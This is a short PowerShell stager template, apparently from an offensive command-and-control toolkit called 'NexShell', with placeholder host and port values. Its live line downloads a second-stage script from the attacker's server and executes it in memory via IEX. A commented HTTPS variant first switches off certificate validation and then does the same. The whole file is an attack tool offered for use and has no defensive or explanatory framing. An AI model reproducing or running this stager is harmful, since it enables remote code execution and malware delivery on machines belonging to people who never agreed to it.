# NexShell Stager — Windows PowerShell
# Fetches and executes stage2 from C2 server in memory
$lhost = '{LHOST}'
$lport = {LPORT}
IEX(New-Object Net.WebClient).DownloadString("http://$lhost:$lport/stage2.ps1")
# HTTPS variant (ignore cert):
# [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
# IEX(New-Object Net.WebClient).DownloadString("https://$lhost:$lport/stage2.ps1")
